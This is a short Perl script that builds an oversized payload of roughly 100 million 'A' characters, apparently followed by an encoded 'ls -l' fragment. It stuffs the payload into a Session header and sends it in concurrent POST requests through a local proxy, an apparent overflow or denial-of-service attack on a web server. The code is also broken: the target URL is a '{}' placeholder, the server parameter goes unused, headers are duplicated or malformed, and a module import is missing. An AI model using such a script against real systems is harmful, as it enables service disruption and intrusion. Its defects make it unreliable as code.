#!/usr/bin/perl

use strict;
use warnings;
use threads;
use LWP::UserAgent;

my $payload = "A" x 99999999 . "6C732D6C";
my $num_threads = 5; # Number of threads to create

# Function to send HTTP request
sub send_http_request {
    my ($server, $payload) = @_;

    my $ua = LWP::UserAgent->new;

    # Set proxy settings
    $ua->proxy(['http', 'https'] => 'http://127.0.0.1:8080');

    my $http_request = HTTP::Request->new(
        POST => "{}",
        [
            'Host'            => 'localhost',
            'Content-Length'  => length($payload),
            'Content-Type'    => 'text/plain',
            'Session'         => '_d838591b3a6257b0111138e6ca76c2c2409fb287b1473aa463db7f202caa09361bd7f8948c8d1adf4bd4f6c1c198eb950754581406246bf8' . $payload,
            'X-Host'          => '{}',
            'X-Forwarded-For' => '{}',
            'Referer'         => '{}',
            'Content-Type'   => 'multipart/form-data; boundary=b2a76b357c894dca991b7e6330bb7ccc',
            'Content-Length: 0\r\n\r\n',
        ],
        ''
    );
    
    print $http_request;


    my $response = $ua->request($http_request);

    if ($response->is_success) {
        print "Thread " . threads->self->tid . " received response:\n" . $response->content . "\n";
    } else {
        print "Thread " . threads->self->tid . " encountered an error: " . $response->status_line . "\n";
    }
}

# Create and start threads
my @threads;
for (1 .. $num_threads) {
    push @threads, threads->create(\&send_http_request, 'example.com', $payload);
}

# Wait for all threads to finish
$_->join for @threads;
